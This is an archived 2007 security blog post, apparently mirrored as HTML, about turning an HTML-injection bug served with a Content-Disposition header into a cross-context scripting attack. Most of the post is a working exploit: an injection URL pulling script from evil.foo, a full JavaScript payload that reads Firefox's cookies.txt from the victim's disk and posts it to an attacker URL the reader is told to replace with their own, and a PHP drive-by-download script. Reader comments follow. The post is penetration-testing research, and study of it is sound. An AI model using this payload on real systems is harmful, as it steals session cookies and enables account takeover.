@@ -1,0 +1,438 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/content-disposition-hacking/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:59:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Content-Disposition Hacking</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Content-Disposition Hacking Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Bugs in the Browser: Firefox&#8217;s DATA URL Scheme Vulnerability' href='../bugs-in-the-browser-firefoxs-data-url-scheme-vulnerability/index.html' />
+<link rel='next' title='ASX plus ClickOnce: Dangerous Combination' href='../asx-plus-clickonce-dangerous-combination/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index5ff4.html?p=535' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-535" class="post">
+	<div class="post-title"><h2><span>Content-Disposition Hacking</span></h2></div>
+	<div class="post-date"><span>published:</span> November 5th, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>In a recent pentest, a colleague of mine pointed out to me a script/html injection vulnerability on one of the hosts we were testing. I then copied and pasted the GET request he forwarded to me on telnet and verified that JavaScript could indeed be injected through the non-sanitized parameter. There were no restrictions on the input length or types of characters. No filtering whatsoever. The attack goes as the following:</p>
+
+<pre><code>GET /cgi-bin/vulnerable.cgi?param=&lt;script&gt;alert(document.location)&lt;/script&gt; HTTP/1.1
+Host: www.target.foo
+Connection: close</code></pre>
+
+<pre><code>HTTP/1.1 200 OK
+Server: Apache
+<strong>Content-Disposition: attachment; filename=button.html</strong>
+Content-Length: 41
+Content-Type: application/octet-stream
+
+&lt;script&gt;alert(document.location)&lt;/script&gt;</code></pre>
+
+<p>This was very interesting. When I pasted the test URL (<em>http://www.target.foo/cgi-bin/vulnerable.cgi?param=&lt;script&gt;alert(document.location)&lt;/script&gt;</em>) in my browser, I thought <q>OK, this is pretty useless, as the browser doesn&#8217;t render the HTML/JS, but rather prompts me to either open or download the file <code>button.html</code></q>. The file to download would contain the payload supplied to the <code>param</code> parameter. Eventually, I realize that this happens due to the server returning a <a href="http://support.microsoft.com/kb/260519">Content-Disposition</a>/attachment HTTP header (see Server&#8217;s response above).</p>
+
+<p>Perhaps <code>vulnerable.cgi</code> was a legacy script that used to be used for dynamically generating the HTML of a menu button. For some reason the server appeared to be misconfigured and would return a <code>Content-Disposition</code> header when generating <code>button.html</code>. Whatever the case is, I then realized that this html injection bug wasn&#8217;t as useless as I had thought, but could eventually lead to a <em>Cross-context Scripting</em> attack. <em>The requirement is that the victim is tricked to open the file once the browser&#8217;s download dialog appears (the kind of a drive-by-download attack would use)</em>. For those of you who don&#8217;t know, the idea of a <em>Cross-context Scripting</em> is to break from the domain-based sandbox to gain local-context privileges (a.k.a. local zone), so that your malicious script can gain access to any data in the local system. Let&#8217;s proceed to the attack:</p>
+
+<pre><code>http://victim.foo/cgi-bin/vulnerable.cgi?param=%3cscript%20src=http://evil.foo/evil.js%3e</code></pre>
+
+<p>You might be better off including the whole payload directly, as opposed to including it from a third-party site through script src. I&#8217;m saying this because IE 7 won&#8217;t allow you to call JavaScript from a third-party website when opening a HTML file locally. So to come around this, simply insert all the JavaScript in the HTML body directly. I prepared a PoC which is based on a payload I <a href="../web-pages-from-hell-2/index.html">wrote</a> a year ago. The idea is that if the user is tricked to visit the attack URL, and then clicks on <code>Open as</code>, Firefox&#8217;s cookies file &#8211; which contains the session IDs of ALL visited domains gets stolen. Not very nice, isn&#8217;t it?</p>
+
+<pre><code>// evil.js - Adrian Pastor (pagvac) - GNUCITIZEN.org
+document.write(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;POST&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;stolenfile&quot;&gt;&lt;/form&gt;&quot;);
+// This code was written by Tyler Akins and has been placed in the
+// public domain.  It would be nice if you left this header intact.
+// Base64 code from Tyler Akins -- http://rumkin.com
+
+var keyStr = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;;
+
+function encode64(input) {
+   var output = &quot;&quot;;
+   var chr1, chr2, chr3;
+   var enc1, enc2, enc3, enc4;
+   var i = 0;
+
+   do {
+      chr1 = input.charCodeAt(i++);
+      chr2 = input.charCodeAt(i++);
+      chr3 = input.charCodeAt(i++);
+
+      enc1 = chr1 &gt;&gt; 2;
+      enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);
+      enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);
+      enc4 = chr3 &amp; 63;
+
+      if (isNaN(chr2)) {
+         enc3 = enc4 = 64;
+      } else if (isNaN(chr3)) {
+         enc4 = 64;
+      }
+
+      output = output + keyStr.charAt(enc1) + keyStr.charAt(enc2) +
+         keyStr.charAt(enc3) + keyStr.charAt(enc4);
+   } while (i &lt; input.length);
+
+   return output;
+}
+// end of Base64 code from Tyler Akins -- http://rumkin.com
+
+
+
+// VARIABLE DECLARATIONS
+var attackersURL = &quot;http://evil.foo/xt.php&quot;; // replace URL value with your own!  for example http://ikwt.com/xt.php
+// interesting Mozilla Firefox files include cookies.txt, signons.txt, key3.db, bookmarks.bak
+var j=0, found=0;
+var strProfileContent, strFirefoxProfileLocation, strPayloadLocation, strProfileName, strHomeFolder;
+var file2steal, strFile2StealContent, strTmp;
+
+//alert(navigator.appName);
+
+// if IE
+if(navigator.appName==&quot;Microsoft Internet Explorer&quot;)
+{
+        var req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        var reqB = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+}
+
+else
+{
+        var req = new XMLHttpRequest();
+        var reqB = new XMLHttpRequest();
+}
+
+strPayloadLocation=String(document.location);
+document.write(&quot;strPayloadLocation: &quot; + strPayloadLocation + &quot;&lt;br&gt;&quot;);
+
+// alert(strPayloadLocation.length);
+
+if(!document.domain)
+        document.write(&quot;&lt;br&gt;Running script on local context!!!&lt;br&gt;&lt;br&gt;&quot;);
+else
+{
+        alert(&quot;This file must be run locally (i.e.: Windows desktop)!&quot;);
+        exit;
+}
+
+// get Windows home folder
+for(j=0; j&lt;strPayloadLocation.length; j++)
+{
+                                //document.write(strPayloadLocation.charAt(j) + &quot; &quot;);
+                                if(strPayloadLocation.charAt(j)==&quot;/&quot;)
+                                {
+                                        ++found;
+
+                                        // in order to obtain Windows user home folder we get up to 6th slash
+                                        // from document.location. i.e.: file:///C:/Documents%20and%20Settings/p0wn3dUser/
+                                        if(found==6)
+                                        {
+                                                strHomeFolder = strPayloadLocation.substring(0, j+1);
+                                                document.write(&quot;strHomeFolder: &quot; + strHomeFolder + &quot;&lt;br&gt;&quot;);
+                                                break;
+                                        }
+
+
+                                }
+}
+
+strFirefoxProfileLocation=strHomeFolder+&quot;Application Data/Mozilla/Firefox/profiles.ini&quot;;
+
+if(!strHomeFolder)
+{
+        alert(&quot;This HTML file must be launched anywhere within your home folder!\ni.e.:\nC:\\Documents and Settings\\myusername\\\nC:\\Documents and Settings\\myusername\\My Documents\\\nC:\\Documents and Settings\\myusername\\Desktop\\&quot;);
+        exit;
+}
+
+document.write(&quot;strFirefoxProfileLocation: &quot; + strFirefoxProfileLocation + &quot;&lt;br&gt;&quot;);
+
+// get contents of strFirefoxProfileLocation
+try
+{
+                //document.write(strFirefoxProfileLocation+&quot;&lt;br&gt;&quot;);
+                req.open(&quot;GET&quot;, strFirefoxProfileLocation, null);
+                req.send(null);
+                //alert(file2steal);
+                if(req.responseText)
+                {
+                        strProfileContent=req.responseText;
+                        document.write(&quot;profileContent:&lt;br&gt;&lt;br&gt;&quot; + strProfileContent + &quot;&lt;br&gt;&lt;br&gt;&quot;);
+
+                        strProfileName=strProfileContent.substring(strProfileContent.indexOf(&quot;/&quot;)+1, strProfileContent.length);
+                        strTmp=strProfileName;
+                        //alert(strProfileName);
+                        //alert(strProfileName.indexOf(&quot;\n&quot;));
+                        //strProfileName=strTmp.substring(0, strProfileName.indexOf(&quot;\n&quot;)-1);
+                        strProfileName=strProfileName.substring(0, strProfileName.indexOf(&quot;\n&quot;)-1);
+                        //strProfileName.indexOf(&quot;\ &quot;)
+                        document.write(&quot;StrProfileName: &quot; + strProfileName + &quot;&lt;br&gt;&quot;);
+                        //document.write(strProfileContent.indexOf(&quot;/&quot;)+&quot;&lt;br&gt;&quot;);
+                }
+
+} catch (e) {};
+
+file2steal = strHomeFolder + &quot;Application Data/Mozilla/Firefox/Profiles/&quot; + strProfileName + &quot;/cookies.txt&quot;;
+document.write(&quot;file2steal: &quot;+ file2steal+&quot;&lt;br&gt;&lt;br&gt;&quot;);
+
+
+// get contents of file2steal
+try
+{
+                reqB.open(&quot;GET&quot;, file2steal, null);
+                reqB.send(null);
+
+                if(reqB.responseText)
+                {
+                        strFile2StealContent=reqB.responseText;
+                        document.write(&quot;strFile2StealContent:&lt;br&gt;&lt;br&gt;&quot; + reqB.responseText + &quot;&lt;br&gt;&lt;br&gt;&quot;);
+                        strFile2StealContent=encode64(reqB.responseText);
+                }
+
+} catch (e) {};
+
+
+document.forms[0].action=attackersURL;
+//alert(document.forms[0].action);
+document.forms[0].stolenfile.value=strFile2StealContent;
+//alert(document.forms[0].stolenfile.value);
+
+// confirm box only added for ethical reason. In a real-world scenario an attacker wouldnt even bother asking you
+// for permission before stealing a file from your filesystem!
+if(confirm(&quot;pagvac says:\n\Do you really want to submit your \&quot;cookies.txt\&quot; file to &quot;+attackersURL+&quot;\n???&quot;))
+        document.forms[0].submit();
+else
+        exit;
+
+document.write(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);</code></pre>
+
+<p>The beauty of this attack is that that the bad guy can exploit the trust the victim has on the <code>victim.foo</code> domain, since the download dialog is initiated from such domain. This case study was to me another reminder that, what sometimes appears to be a useless vulnerability, can be turned into something more useful by using a bit of imagination.</p>
+
+<p>Needless to say, if you visit a site controlled by the attacker, the same effect can be accomplished by simply configuring the server to return a <code>Content-Disposition</code> header. This is one of the many ways to perform <a href="../hacking-without-0days-drive-by-java/index.html">drive-by download attacks</a>. The following is a PHP script that would allow you to perform a <code>content-disposition</code> drive-by download that would run JavaScript with local privilege &#8211; assuming that the victim is tricked to open the <code>bad.html</code> file:</p>
+
+<pre><code>&lt;?
+
+header(&quot;Content-Disposition: attachment; filename=bad.html&quot;);
+header(&quot;Content-Type: text/html&quot;);
+readfile(&quot;http://www.gnucitizen.org/blog/web-pages-from-hell-2/theft_of_Win_FF_cookies.html&quot;);
+
+?&gt;</code></pre>
+
+<p>If you want to experiment with <code>Content-Disposition</code> headers, you can simply run a netcat server on the go. All you need is a script such as the following:</p>
+
+<pre><code>#!/bin/bash
+# run-server.sh
+
+while true
+do
+       cat response | nc -v -l -p55555
+       # connect to localhost:55555 using your favorite browser
+       sleep 2
+done</code></pre>
+
+<p>Content of response file:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Server: test
+content-disposition: attachment; filename=test.html
+Content-length: 16
+Content-Type: application/octet-stream
+
+whatever content</code></pre>
+
+<p><em>Have fun and let me know if you find something interesting!</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
+	</div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-65436">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e0f595cbc8f1811233adce10ac6c5d3?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.awesomeandrew.net/' rel='external nofollow' class='url'>Awesome AnDrEw</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-65436">
+			November 5, 2007 at 5:29 pm</a>		</div>
+
+		<p>This is a lot similar to many forum services that offer user-uploadable attachments, and then use the &#8220;Content-Disposition&#8221; header to have them appear in a prompt as displayed. I&#8217;ve never come across a situation other than something along those lines though I did do some experimenting with files served in that manner, and figured that as the file executes in a local zone (the internet cache) if one could convince someone else to open the file as long as it did not contain any off-site files it should render on Internet Explorer without the ActiveX warning appearing.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-65808">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/43339143dc6f7b2c4e370bda638ab0e5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Alice</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-65808">
+			November 6, 2007 at 8:15 am</a>		</div>
+
+		<p>It&#8217;s weird, I was attempting to do this exact same thing only yesterday, and now I see your article.</p>
+<p>Very good work- it&#8217;ll come in handy.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-67435">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7a2bd432bd10cbf14f24621356a109ad?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Gafoa</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-67435">
+			November 8, 2007 at 2:53 am</a>		</div>
+
+		<p>people at gnu are just smart I plan on looking for a few bugs etc&#8230; My self now</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-72693">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/1ef7b4d2c0e4c4b7d034c56fd70ac2f4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">eXeCuTe</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-72693">
+			November 18, 2007 at 12:45 pm</a>		</div>
+
+		<p>Alice, it&#8217;s even more weird. i also tried that, yesterday, and now i see this.. strange :)</p>
+<p>anyway, this is a really cool idea&#8230; but i do get the ActiveX warning on IE, even if i don&#8217;t use any off-site files, why is that?<br />
+with FF it works great..</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-74436">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-74436">
+			November 20, 2007 at 2:34 pm</a>		</div>
+
+		<p>@eXeCuTe &#8211; IE 7 displays a warning when opening files locall &#8211; which is great in my opinion. Even opening a .html file with a empty JS snippet causes the warning to show: </p>
+<pre><code>&lt;script&gt;//TEST&lt;/script&gt;</code></pre>
+<p>On Firefox however, no warning is shown, which scares me as you can steal any files by using XHR()</p>
+<p>Anyway, if you can cause manipulate the content-disposition reponse on a site, you can exploit the trust the victim has on that brand/company.</p>
+<p>@Alice and @eXeCuTe &#8211; what you guys are telling is creeping the heck out of me! I guess we all are in similar frequencies!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-74437">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-74437">
+			November 20, 2007 at 2:35 pm</a>		</div>
+
+		<p>btw, I meant to say *locally*.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="535"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="f61d0664fb" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/content-disposition-hacking/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:59:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
